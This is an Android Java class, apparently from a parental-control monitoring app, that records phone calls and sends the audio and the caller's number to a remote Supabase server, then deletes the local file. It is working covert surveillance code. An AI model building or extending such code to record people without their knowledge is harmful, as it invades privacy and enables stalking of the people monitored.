package com.parentalcontrol.monitor;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.util.Log;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;

public class CallAudioRecorder {
    
    private static final String TAG = "CallAudioRecorder";
    
    private Context context;
    private SupabaseClient supabaseClient;
    private String deviceId;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String currentRecordingFile;
    private String currentPhoneNumber;
    
    public CallAudioRecorder(Context context) {
        this.context = context;
        this.supabaseClient = new SupabaseClient(context);
        this.deviceId = DeviceUtils.getDeviceId(context);
    }
    
    public void startRecording(String phoneNumber) {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Audio recording permission not granted");
            return;
        }
        
        if (isRecording) {
            Log.w(TAG, "Recording already in progress");
            return;
        }
        
        try {
            // Create file for call recording
            File recordingFile = new File(context.getCacheDir(), "call_" + System.currentTimeMillis() + ".3gp");
            currentRecordingFile = recordingFile.getAbsolutePath();
            currentPhoneNumber = phoneNumber;
            
            // Initialize MediaRecorder for call recording
            mediaRecorder = new MediaRecorder();
            
            // Try different audio sources for call recording
            try {
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
            } catch (Exception e) {
                try {
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                } catch (Exception e2) {
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
                }
            }
            
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentRecordingFile);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            Log.i(TAG, "Call recording started for: " + phoneNumber);
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting call recording", e);
            cleanup();
        }
    }
    
    public void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
                
                Log.i(TAG, "Call recording stopped");
                
                // Upload the recorded call
                uploadCallRecording();
                
            } catch (Exception e) {
                Log.e(TAG, "Error stopping call recording", e);
                cleanup();
            }
        }
    }
    
    private void uploadCallRecording() {
        if (currentRecordingFile == null) {
            return;
        }
        
        try {
            File recordingFile = new File(currentRecordingFile);
            if (!recordingFile.exists() || recordingFile.length() == 0) {
                Log.w(TAG, "Recording file is empty or doesn't exist");
                cleanup();
                return;
            }
            
            // Read file into byte array
            FileInputStream fis = new FileInputStream(recordingFile);
            byte[] audioBytes = new byte[(int) recordingFile.length()];
            fis.read(audioBytes);
            fis.close();
            
            // Generate unique filename
            String filename = "call_" + deviceId + "_" + System.currentTimeMillis() + ".3gp";
            
            // Upload to Supabase storage
            supabaseClient.uploadAudio(filename, audioBytes, new SupabaseClient.ApiCallback() {
                @Override
                public void onSuccess(String response) {
                    try {
                        // Log call recording event
                        JSONObject callRecordingData = new JSONObject();
                        callRecordingData.put("event", "call_recorded");
                        callRecordingData.put("phone_number", currentPhoneNumber);
                        callRecordingData.put("audio_url", response);
                        callRecordingData.put("duration", getDurationFromFile(recordingFile));
                        callRecordingData.put("timestamp", System.currentTimeMillis());
                        
                        supabaseClient.logActivity(deviceId, "call_recording", callRecordingData, new SupabaseClient.ApiCallback() {
                            @Override
                            public void onSuccess(String logResponse) {
                                Log.d(TAG, "Call recording uploaded and logged successfully");
                                cleanup();
                            }
                            
                            @Override
                            public void onError(String error) {
                                Log.e(TAG, "Failed to log call recording: " + error);
                                cleanup();
                            }
                        });
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error logging call recording", e);
                        cleanup();
                    }
                }
                
                @Override
                public void onError(String error) {
                    Log.e(TAG, "Failed to upload call recording: " + error);
                    cleanup();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error uploading call recording", e);
            cleanup();
        }
    }
    
    private int getDurationFromFile(File audioFile) {
        try {
            android.media.MediaMetadataRetriever retriever = new android.media.MediaMetadataRetriever();
            retriever.setDataSource(audioFile.getAbsolutePath());
            String duration = retriever.extractMetadata(android.media.MediaMetadataRetriever.METADATA_KEY_DURATION);
            retriever.release();
            
            return duration != null ? Integer.parseInt(duration) / 1000 : 0; // Convert to seconds
        } catch (Exception e) {
            Log.e(TAG, "Error getting audio duration", e);
            return 0;
        }
    }
    
    private void cleanup() {
        // Delete temporary recording file
        if (currentRecordingFile != null) {
            try {
                File recordingFile = new File(currentRecordingFile);
                if (recordingFile.exists()) {
                    recordingFile.delete();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error deleting temporary recording file", e);
            }
            currentRecordingFile = null;
        }
        
        currentPhoneNumber = null;
    }
    
    public boolean isRecording() {
        return isRecording;
    }
}